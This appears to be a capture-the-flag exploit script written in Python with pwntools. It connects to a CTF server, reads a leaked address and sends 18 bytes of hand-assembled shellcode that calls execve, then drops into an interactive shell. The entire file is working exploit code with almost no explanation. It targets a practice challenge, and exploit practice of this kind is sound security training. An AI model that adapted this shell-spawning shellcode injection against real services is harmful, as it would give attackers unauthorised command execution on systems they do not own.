#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
#r = remote('localhost', 4000)
r = remote('ctf.ccns.ncku.edu.tw', 32768)

r.recvuntil('key: ')
leak = r.recvline()

# length = 18
sc = asm("""
        mov al, 0x3b
        mov rdi, """
        + leak +
        """
        xor esi, esi
        xor edx, edx
        syscall
        """)
log.info('length: ' + str(len(sc)))
r.sendafter('command(length<=20): ', sc+'AA')

r.interactive()
